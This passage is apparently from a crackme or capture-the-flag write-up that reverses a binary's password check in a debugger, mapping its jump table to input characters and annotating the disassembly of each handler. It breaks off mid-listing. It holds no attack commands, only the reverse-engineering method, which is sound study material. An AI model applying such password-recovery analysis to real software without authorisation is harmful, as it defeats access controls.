</span><span class='line'>0x8048ce0:    0x080485de  0x080485de  0x080485de  0x08048780
</span><span class='line'>0x8048cf0:    0x080487a0  0x080487c0  0x080487e0  0x08048800
</span><span class='line'>0x8048d00:    0x08048820  0x08048840  0x08048858  0x08048878
</span><span class='line'>0x8048d10:    0x08048898  0x080488b8  0x080488d0  0x080488f0
</span><span class='line'>0x8048d20:    0x08048910  0x08048928  0x08048950  0x08048970
</span><span class='line'>0x8048d30:    0x08048990  0x080489b0  0x080489d0  0x080489e8
</span><span class='line'>0x8048d40:    0x08048a08  0x08048a28  0x08048a48  0x08048a68
</span><span class='line'>0x8048d50:    0x08048a88  0x73736150  0x64726f77  0x4300203a
</span></code></pre></td></tr></table></div></figure>


<p>There are a lot of occurences of <code>0x080485de</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485de:    xor    eax,eax
</span><span class='line'>   0x80485e0: mov    edx,DWORD PTR <span class="o">[</span>esp+0x8c<span class="o">]</span>
</span><span class='line'>   0x80485e7: xor    edx,DWORD PTR gs:0x14
</span><span class='line'>   0x80485ee: jne    0x8048ab0
</span><span class='line'>   0x80485f4: add    esp,0x9c
</span><span class='line'>   0x80485fa: pop    ebx
</span><span class='line'>   0x80485fb: pop    esi
</span><span class='line'>   0x80485fc: pop    edi
</span><span class='line'>   0x80485fd: pop    ebp
</span><span class='line'>   0x80485fe: ret
</span></code></pre></td></tr></table></div></figure>


<p>Which basically means &ldquo;get out of here, your password isn&rsquo;t correct&rdquo;. I decided to continue and see what the code did:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048603:  jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x804860a:  lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'> <span class="p">|</span> 0x8048610:  cmp    edx,0xd
</span><span class='line'> <span class="p">|</span> 0x8048613:  sete   dl
</span><span class='line'> <span class="p">|</span> 0x8048616:  xor    eax,eax
</span><span class='line'> <span class="p">|</span>-&gt;   0x8048628:   <span class="nb">test   </span>edx,edx
</span><span class='line'>       0x804862a: jne    0x80485de
</span><span class='line'>       0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>       0x8048631: je     0x80485de
</span><span class='line'>       0x8048633: mov    edx,0x1
</span><span class='line'>       0x8048638: jmp    0x80485ab
</span></code></pre></td></tr></table></div></figure>


<p>It checks if <code>edx</code> is zero. If it is, it checks if some memory location is zero (it was) and then sets edx to 1. It then goes back to the code where a byte is taken from the password. Only this time, it would be the second byte! This means that I accidentally guessed the first char of the password right. The next one was not correct, as I supplied <code>1</code> which then jumps to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x8048640:    cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span></code></pre></td></tr></table></div></figure>


<p>Because <code>edx</code> was not set to <code>0xe</code>, the check fails and the password is incorrect. From here on, I dumped the jumptable and gave each memory location a label using a python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x08048610:
</span><span class='line'>...snip...
</span><span class='line'>0x080485de:!
</span><span class='line'>0x080485de:<span class="err">&quot;</span>
</span><span class='line'>0x080485de:#
</span><span class='line'>0x080485de:<span class="err">$</span>
</span><span class='line'>0x080485de:%
</span><span class='line'>0x080485de:<span class="p">&amp;</span>
</span><span class='line'>0x080485de:<span class="err">&#39;</span>
</span><span class='line'>0x080485de:<span class="o">(</span>
</span><span class='line'>0x080485de:<span class="o">)</span>
</span><span class='line'>0x080485de:*
</span><span class='line'>0x080485de:+
</span><span class='line'>0x080485de:,
</span><span class='line'>0x080485de:-
</span><span class='line'>0x080485de:.
</span><span class='line'>0x080485de:/
</span><span class='line'>0x08048628:0
</span><span class='line'>0x08048640:1
</span><span class='line'>0x08048658:2
</span><span class='line'>0x08048678:3
</span><span class='line'>0x08048698:4
</span><span class='line'>0x080486c0:5
</span><span class='line'>0x080486e0:6
</span><span class='line'>0x08048708:7
</span><span class='line'>0x08048730:8
</span><span class='line'>0x08048758:9
</span><span class='line'>0x080485de::
</span><span class='line'>0x080485de:<span class="p">;</span>
</span><span class='line'>0x080485de:&lt;
</span><span class='line'>0x080485de:<span class="o">=</span>
</span><span class='line'>0x080485de:&gt;
</span><span class='line'>0x080485de:?
</span><span class='line'>0x080485de:@
</span><span class='line'>0x080485de:A
</span><span class='line'>0x080485de:B
</span><span class='line'>0x080485de:C
</span><span class='line'>0x080485de:D
</span><span class='line'>0x080485de:E
</span><span class='line'>0x080485de:F
</span><span class='line'>0x080485de:G
</span><span class='line'>0x080485de:H
</span><span class='line'>0x080485de:I
</span><span class='line'>0x080485de:J
</span><span class='line'>0x080485de:K
</span><span class='line'>0x080485de:L
</span><span class='line'>0x080485de:M
</span><span class='line'>0x080485de:N
</span><span class='line'>0x080485de:O
</span><span class='line'>0x080485de:P
</span><span class='line'>0x080485de:Q
</span><span class='line'>0x080485de:R
</span><span class='line'>0x080485de:S
</span><span class='line'>0x080485de:T
</span><span class='line'>0x080485de:U
</span><span class='line'>0x080485de:V
</span><span class='line'>0x080485de:W
</span><span class='line'>0x080485de:X
</span><span class='line'>0x080485de:Y
</span><span class='line'>0x080485de:Z
</span><span class='line'>0x080485de:<span class="o">[</span>
</span><span class='line'>0x080485de:<span class="se">\</span>
</span><span class='line'>0x080485de:<span class="o">]</span>
</span><span class='line'>0x080485de:^
</span><span class='line'>0x080485de:_
</span><span class='line'>0x080485de:<span class="sb">`</span>
</span><span class='line'>0x08048780:a
</span><span class='line'>0x080487a0:b
</span><span class='line'>0x080487c0:c
</span><span class='line'>0x080487e0:d
</span><span class='line'>0x08048800:e
</span><span class='line'>0x08048820:f
</span><span class='line'>0x08048840:g
</span><span class='line'>0x08048858:h
</span><span class='line'>0x08048878:i
</span><span class='line'>0x08048898:j
</span><span class='line'>0x080488b8:k
</span><span class='line'>0x080488d0:l
</span><span class='line'>0x080488f0:m
</span><span class='line'>0x08048910:n
</span><span class='line'>0x08048928:o
</span><span class='line'>0x08048950:p
</span><span class='line'>0x08048970:q
</span><span class='line'>0x08048990:r
</span><span class='line'>0x080489b0:s
</span><span class='line'>0x080489d0:t
</span><span class='line'>0x080489e8:u
</span><span class='line'>0x08048a08:v
</span><span class='line'>0x08048a28:w
</span><span class='line'>0x08048a48:x
</span><span class='line'>0x08048a68:y
</span><span class='line'>0x08048a88:z
</span></code></pre></td></tr></table></div></figure>


<p>Then I dumped all the instructions starting at <code>0x8048610</code> and labelled them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   // 0x0a
</span><span class='line'>   0x8048610: cmp    edx,0xd  
</span><span class='line'>   0x8048613: sete   dl
</span><span class='line'>   0x8048616: xor    eax,eax
</span><span class='line'>   0x8048618: cmp    BYTE PTR <span class="o">[</span>esp+0x56<span class="o">]</span>,0x0
</span><span class='line'>   0x804861d: setne  al
</span><span class='line'>   0x8048620: and    eax,edx
</span><span class='line'>   0x8048622: jmp    0x80485e0
</span><span class='line'>   0x8048624: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048628:0
</span><span class='line'>   0x8048628: <span class="nb">test   </span>edx,edx
</span><span class='line'>   0x804862a: jne    0x80485de
</span><span class='line'>   0x804862c: cmp    BYTE PTR <span class="o">[</span>esp+0x7c<span class="o">]</span>,0x0
</span><span class='line'>   0x8048631: je     0x80485de
</span><span class='line'>   0x8048633: mov    edx,0x1
</span><span class='line'>   0x8048638: jmp    0x80485ab
</span><span class='line'>   0x804863d: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048640:1
</span><span class='line'>   0x8048640: cmp    edx,0xe
</span><span class='line'>   0x8048643: jne    0x80485de
</span><span class='line'>   0x8048645: cmp    BYTE PTR <span class="o">[</span>esp+0x7d<span class="o">]</span>,0x0
</span><span class='line'>   0x804864a: je     0x80485de
</span><span class='line'>   0x804864c: mov    edx,0xf
</span><span class='line'>   0x8048651: jmp    0x80485ab
</span><span class='line'>   0x8048656: xchg   ax,ax
</span><span class='line'>   // 0x08048658:2
</span><span class='line'>   0x8048658: cmp    edx,0x14
</span><span class='line'>   0x804865b: jne    0x80485de
</span><span class='line'>   0x804865d: cmp    BYTE PTR <span class="o">[</span>esp+0x7e<span class="o">]</span>,0x0
</span><span class='line'>   0x8048662: je     0x80485de
</span><span class='line'>   0x8048668: mov    edx,0x15
</span><span class='line'>   0x804866d: jmp    0x80485ab
</span><span class='line'>   0x8048672: lea    esi,<span class="o">[</span>esi+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048678:3
</span><span class='line'>   0x8048678: cmp    edx,0x59
</span><span class='line'>   0x804867b: jne    0x80485de
</span><span class='line'>   0x8048681: cmp    BYTE PTR <span class="o">[</span>esp+0x7f<span class="o">]</span>,0x0
</span><span class='line'>   0x8048686: je     0x80485de
</span><span class='line'>   0x804868c: mov    edx,0x5a
</span><span class='line'>   0x8048691: jmp    0x80485ab
</span><span class='line'>   0x8048696: xchg   ax,ax
</span><span class='line'>   // 0x08048698:4
</span><span class='line'>   0x8048698: cmp    edx,0xf
</span><span class='line'>   0x804869b: jne    0x80485de
</span><span class='line'>   0x80486a1: cmp    BYTE PTR <span class="o">[</span>esp+0x80<span class="o">]</span>,0x0
</span><span class='line'>   0x80486a9: je     0x80485de
</span><span class='line'>   0x80486af: mov    edx,0x10
</span><span class='line'>   0x80486b4: jmp    0x80485ab
</span><span class='line'>   0x80486b9: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486c0:5
</span><span class='line'>   0x80486c0: cmp    edx,0xe
</span><span class='line'>   0x80486c3: jne    0x80485de
</span><span class='line'>   0x80486c9: cmp    BYTE PTR <span class="o">[</span>esp+0x81<span class="o">]</span>,0x0
</span><span class='line'>   0x80486d1: jne    0x804864c
</span><span class='line'>   0x80486d7: jmp    0x80485de
</span><span class='line'>   0x80486dc: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x080486e0:6
</span><span class='line'>   0x80486e0: cmp    edx,0xc
</span><span class='line'>   0x80486e3: jne    0x80485de
</span><span class='line'>   0x80486e9: cmp    BYTE PTR <span class="o">[</span>esp+0x82<span class="o">]</span>,0x0
</span><span class='line'>   0x80486f1: je     0x80485de
</span><span class='line'>   0x80486f7: mov    edx,0xd
</span><span class='line'>   0x80486fc: jmp    0x80485ab
</span><span class='line'>   0x8048701: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048708:7
</span><span class='line'>   0x8048708: cmp    edx,0x5
</span><span class='line'>   0x804870b: jne    0x80485de
</span><span class='line'>   0x8048711: cmp    BYTE PTR <span class="o">[</span>esp+0x83<span class="o">]</span>,0x0
</span><span class='line'>   0x8048719: je     0x80485de
</span><span class='line'>   0x804871f: mov    edx,0x6
</span><span class='line'>   0x8048724: jmp    0x80485ab
</span><span class='line'>   0x8048729: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // ?? 0x08048730:8
</span><span class='line'>   0x8048730: xor    eax,eax
</span><span class='line'>   0x8048732: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x804873a: je     0x80485e0
</span><span class='line'>   0x8048740: cmp    edx,0x2
</span><span class='line'>   0x8048743: sete   al
</span><span class='line'>   0x8048746: cmp    edx,0x21
</span><span class='line'>   0x8048749: sete   dl
</span><span class='line'>   0x804874c: or     eax,edx
</span><span class='line'>   0x804874e: movzx  eax,al
</span><span class='line'>   0x8048751: jmp    0x80485e0
</span><span class='line'>   0x8048756: xchg   ax,ax
</span><span class='line'>   // 0x08048758:9
</span><span class='line'>   0x8048758: cmp    edx,0x1
</span><span class='line'>   0x804875b: jne    0x80485de
</span><span class='line'>   0x8048761: cmp    BYTE PTR <span class="o">[</span>esp+0x85<span class="o">]</span>,0x0
</span><span class='line'>   0x8048769: je     0x80485de
</span><span class='line'>   0x804876f: mov    edx,0x2
</span><span class='line'>   0x8048774: jmp    0x80485ab
</span><span class='line'>   0x8048779: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048780:a
</span><span class='line'>   0x8048780: cmp    edx,0x23
</span><span class='line'>   0x8048783: jne    0x80485de
</span><span class='line'>   0x8048789: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x804878e: je     0x80485de
</span><span class='line'>   0x8048794: mov    edx,0x24
</span><span class='line'>   0x8048799: jmp    0x80485ab
</span><span class='line'>   0x804879e: xchg   ax,ax
</span><span class='line'>   // 0x080487a0:b
</span><span class='line'>   0x80487a0: cmp    edx,0xb
</span><span class='line'>   0x80487a3: jne    0x80485de
</span><span class='line'>   0x80487a9: cmp    BYTE PTR <span class="o">[</span>esp+0x2e<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ae: je     0x80485de
</span><span class='line'>   0x80487b4: mov    edx,0xc
</span><span class='line'>   0x80487b9: jmp    0x80485ab
</span><span class='line'>   0x80487be: xchg   ax,ax
</span><span class='line'>   0x080487c0:c
</span><span class='line'>   0x80487c0: cmp    edx,0x20
</span><span class='line'>   0x80487c3: jne    0x80485de
</span><span class='line'>   0x80487c9: cmp    BYTE PTR <span class="o">[</span>esp+0x2d<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ce: je     0x80485de
</span><span class='line'>   0x80487d4: mov    edx,0x21
</span><span class='line'>   0x80487d9: jmp    0x80485ab
</span><span class='line'>   0x80487de: xchg   ax,ax
</span><span class='line'>  // 0x080487e0:d
</span><span class='line'>   0x80487e0: cmp    edx,0x3
</span><span class='line'>   0x80487e3: jne    0x80485de
</span><span class='line'>   0x80487e9: cmp    BYTE PTR <span class="o">[</span>esp+0x30<span class="o">]</span>,0x0
</span><span class='line'>   0x80487ee: je     0x80485de
</span><span class='line'>   0x80487f4: mov    edx,0x4
</span><span class='line'>   0x80487f9: jmp    0x80485ab
</span><span class='line'>   0x80487fe: xchg   ax,ax
</span><span class='line'>   // 0x08048800:e
</span><span class='line'>   0x8048800: cmp    edx,0x7
</span><span class='line'>   0x8048803: jne    0x80485de
</span><span class='line'>   0x8048809: cmp    BYTE PTR <span class="o">[</span>esp+0x31<span class="o">]</span>,0x0
</span><span class='line'>   0x804880e: je     0x80485de
</span><span class='line'>   0x8048814: mov    edx,0x8
</span><span class='line'>   0x8048819: jmp    0x80485ab
</span><span class='line'>   0x804881e: xchg   ax,ax
</span><span class='line'>   // 0x08048820:f
</span><span class='line'>   0x8048820: cmp    BYTE PTR <span class="o">[</span>esp+0x32<span class="o">]</span>,0x0
</span><span class='line'>   0x8048825: je     0x80485de
</span><span class='line'>   0x804882b: cmp    edx,0x8
</span><span class='line'>   0x804882e: jne    0x8048a9f
</span><span class='line'>   0x8048834: add    edx,0x1
</span><span class='line'>   0x8048837: jmp    0x80485ab
</span><span class='line'>   0x804883c: lea    esi,<span class="o">[</span>esi+eiz*1+0x0<span class="o">]</span>
</span><span class='line'>   // 0x08048840:g
</span><span class='line'>   0x8048840: cmp    edx,0xc
</span><span class='line'>   0x8048843: sete   dl
</span><span class='line'>   0x8048846: xor    eax,eax
</span><span class='line'>   0x8048848: cmp    BYTE PTR <span class="o">[</span>esp+0x40<span class="o">]</span>,0x0
</span><span class='line'>   0x804884d: setne  al
</span><span class='line'>   0x8048850: and    eax,edx
</span><span class='line'>   0x8048852: jmp    0x80485e0
</span><span class='line'>   0x8048857: nop
</span><span class='line'>   // 0x08048858:h
</span><span class='line'>   0x8048858: cmp    edx,0xd
</span><span class='line'>   0x804885b: jne    0x80485de
</span><span class='line'>   0x8048861: cmp    BYTE PTR <span class="o">[</span>esp+0x33<span class="o">]</span>,0x0
</span><span class='line'>   0x8048866: je     0x80485de
</span><span class='line'>   0x804886c: mov    edx,0xe
</span><span class='line'>   0x8048871: jmp    0x80485ab
</span><span class='line'>   0x8048876: xchg   ax,ax
</span><span class='line'>   // 0x08048878:i
</span><span class='line'>   0x8048878: cmp    edx,0x9
</span><span class='line'>   0x804887b: jne    0x80485de
</span><span class='line'>   0x8048881: cmp    BYTE PTR <span class="o">[</span>esp+0x35<span class="o">]</span>,0x0
</span><span class='line'>   0x8048886: je     0x80485de
</span><span class='line'>   0x804888c: mov    edx,0xa
</span><span class='line'>   0x8048891: jmp    0x80485ab
</span><span class='line'>   0x8048896: xchg   ax,ax
</span><span class='line'>   // 0x08048898:j
</span><span class='line'>   0x8048898: cmp    edx,0xa
</span><span class='line'>   0x804889b: jne    0x80485de
</span><span class='line'>   0x80488a1: cmp    BYTE PTR <span class="o">[</span>esp+0x36<span class="o">]</span>,0x0
